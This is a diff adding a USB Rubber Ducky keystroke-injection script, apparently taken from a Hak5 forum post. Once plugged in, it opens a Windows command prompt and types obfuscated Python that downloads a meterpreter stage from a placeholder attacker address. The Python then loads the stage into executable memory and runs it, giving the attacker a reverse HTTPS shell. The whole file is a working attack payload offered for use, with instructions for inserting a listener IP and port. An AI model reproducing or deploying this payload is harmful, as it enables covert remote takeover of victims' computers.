@@ -1,0 +1,143 @@
+REM https://forums.hak5.org/index.php?/topic/36694-payload-python-reverse-https-meterpreter-stager-good-for-beginners-plus-a-question/
+REM Author: lighteyes
+REM Title: Python meterpreter reverse https in cmd line
+REM This payload opens a cmd prompt and then drops a reverse https meterpreter stage 
+REM using python interactive mode
+REM To use, replace the IP address and PORT at the bottom of the script with your listening
+REM IP address and port.
+DELAY 3000
+ESCAPE
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 100
+STRING python
+ENTER
+DELAY 200
+STRING import urllib2 , string , random , struct , ctypes , httplib , time
+ENTER
+STRING def oo000 ( s ) : return sum ( [ ord ( ii ) for ii in s ] ) % 0x100
+ENTER
+ENTER
+STRING def oOOo ( ) :
+ENTER
+TAB
+STRING for O0 in xrange ( 64 ) :
+ENTER
+TAB
+TAB
+STRING o0O = '' . join ( random . sample ( string . ascii_letters + string . digits , 3 ) )
+ENTER
+TAB
+TAB
+STRING iI11I1II1I1I = '' . join ( sorted ( list ( string . ascii_letters + string . digits ) , key = lambda * oooo : random . random ( ) ) )
+ENTER
+TAB
+TAB
+STRING for iIIii1IIi in iI11I1II1I1I :
+ENTER
+TAB
+TAB
+TAB
+STRING if oo000 ( o0O + iIIii1IIi ) == 92 : return o0O + iIIii1IIi
+ENTER
+ENTER
+STRING def o0OO00 ( VTwciBrQOOV , uoifdK ) :
+ENTER
+TAB
+STRING oo = urllib2 . ProxyHandler ( )
+ENTER
+TAB
+STRING i1iII1IiiIiI1 = urllib2 . build_opener ( oo )
+ENTER
+TAB
+STRING urllib2 . install_opener ( i1iII1IiiIiI1 )
+ENTER
+TAB
+STRING iIiiiI1IiI1I1 = urllib2 . Request ( "https://%s:%s/%s" % ( VTwciBrQOOV , uoifdK , oOOo ( ) ) , None , { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' } )
+ENTER
+TAB
+STRING try :
+ENTER
+TAB
+TAB
+STRING o0OoOoOO00 = urllib2 . urlopen ( iIiiiI1IiI1I1 )
+ENTER
+TAB
+TAB
+STRING try :
+ENTER
+TAB
+TAB
+TAB
+STRING if int ( o0OoOoOO00 . info ( ) [ "Content-Length" ] ) > 100000 : 
+ENTER
+TAB
+TAB
+TAB
+TAB
+STRING return o0OoOoOO00 . read ( )
+ENTER
+TAB
+TAB
+TAB
+STRING else :
+ENTER
+TAB
+TAB
+TAB
+TAB
+STRING return ''
+ENTER
+TAB
+TAB
+STRING except : return o0OoOoOO00 . read ( )
+ENTER
+TAB
+STRING except urllib2 . URLError , I11i : return ''
+ENTER
+ENTER
+STRING def O0O ( ckqyRbVIkGuR ) :
+ENTER
+TAB
+STRING if ckqyRbVIkGuR != "" :
+ENTER
+TAB
+TAB
+STRING Oo = bytearray ( ckqyRbVIkGuR )
+ENTER
+TAB
+TAB
+STRING I1ii11iIi11i = ctypes . windll . kernel32 . VirtualAlloc ( ctypes . c_int ( 0 ) , ctypes . c_int ( len ( Oo ) ) , ctypes . c_int ( 0x3000 ) , ctypes . c_int ( 0x40 ) )
+ENTER
+TAB
+TAB
+STRING I1IiI = ( ctypes . c_char * len ( Oo ) ) . from_buffer ( Oo )
+ENTER
+TAB
+TAB
+STRING ctypes . windll . kernel32 . RtlMoveMemory ( ctypes . c_int ( I1ii11iIi11i ) , I1IiI , ctypes . c_int ( len ( Oo ) ) )
+ENTER
+TAB
+TAB
+STRING o0OOO = ctypes . windll . kernel32 . CreateThread ( ctypes . c_int ( 0 ) , ctypes . c_int ( 0 ) , ctypes . c_int ( I1ii11iIi11i ) , ctypes . c_int ( 0 ) , ctypes . c_int ( 0 ) , ctypes . pointer ( ctypes . c_int ( 0 ) ) )
+ENTER
+TAB
+TAB
+STRING ctypes . windll . kernel32 . WaitForSingleObject ( ctypes . c_int ( o0OOO ) , ctypes . c_int ( - 1 ) )
+ENTER
+ENTER
+STRING iIiiiI = ''
+ENTER
+STRING iIiiiI = o0OO00 ( "YOURIP" , PORT )
+ENTER
+DELAY 3000
+STRING O0O ( iIiiiI )
+ENTER
+DELAY 10000
+STRING exit()
+ENTER
+DELAY 1000
+STRING exit
+ENTER
